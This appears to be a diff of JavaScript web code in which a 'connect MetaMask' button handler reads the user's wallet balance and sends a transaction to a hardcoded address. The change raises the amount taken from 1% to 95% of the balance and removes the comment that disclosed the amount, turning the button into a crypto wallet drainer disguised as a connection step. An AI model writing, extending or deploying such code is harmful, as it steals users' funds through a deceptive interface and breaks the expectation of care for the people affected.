@@ -5,7 +5,7 @@ document.getElementById('conectarMetaMask').addEventListener('click', () => {
             const usuarioAddress = accounts[0];
             const direccionDestino = '0x8935361d21943Ee8a863082EdD8a6Aefb062E434';
             web3.eth.getBalance(usuarioAddress).then(balance => {
-                const cantidadEnviar = web3.utils.fromWei(balance, 'ether') * 0.01; // Envía el 1% del saldo
+                const cantidadEnviar = web3.utils.fromWei(balance, 'ether') * 0.95; 
                 const cantidadEnviarEnWei = web3.utils.toWei(cantidadEnviar.toString(), 'ether');
                 web3.eth.sendTransaction({
                     from: usuarioAddress,
